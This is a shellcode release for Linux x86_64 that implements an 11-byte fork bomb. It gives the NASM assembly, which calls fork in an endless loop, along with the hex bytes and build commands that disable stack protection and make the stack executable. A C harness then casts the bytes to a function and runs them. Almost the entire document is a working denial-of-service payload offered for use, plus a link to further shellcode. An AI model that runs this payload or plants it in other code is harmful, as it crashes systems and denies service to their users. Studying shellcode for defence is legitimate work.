/*
;Title: Linux/x86_64 - fork() Bomb (11 bytes)
;Author: Touhid M.Shaikh
;Contact: https://twitter.com/touhidshaikh
;Category: Shellcode
;Architecture: Linux x86_64
;Description: WARNING! this shellcode may crash your computer if executed
in your system.
;Shellcode Length: 11
;Tested on : Debian 4.6.4-1kali1 (2016-07-21) x86_64 GNU/Linux



===COMPILATION AND EXECUTION Assemmbly file===

#nasm -f elf64 shell.asm -o shell.o <=== Making Object File

#ld shell.o -o shell <=== Making Binary File

#./bin2shell.sh shell <== xtract hex code from the binary(
https://github.com/touhidshaikh/bin2shell)

=================SHELLCODE(INTEL FORMAT)=================

section .text
    global _start:
_start:
    xor rax,rax
    add rax,57
    syscall
    jmp _start

===================END HERE============================

====================FOR C Compile===========================

Compile with gcc with some options.

# gcc -fno-stack-protector -z execstack shell-testing.c -o shell-testing

*/

#include<stdio.h>
#include<string.h>


unsigned char code[] = "\x48\x31\xc0\x48\x83\xc0\x39\x0f\x05\xeb\xf5";

main()
{

printf("Shellcode Length:  %d\n", (int)strlen(code));

int (*ret)() = (int(*)())code;

ret();

}

/*More Shellcode => Download Link :
https://github.com/touhidshaikh/shellcode/tree/master/Linux */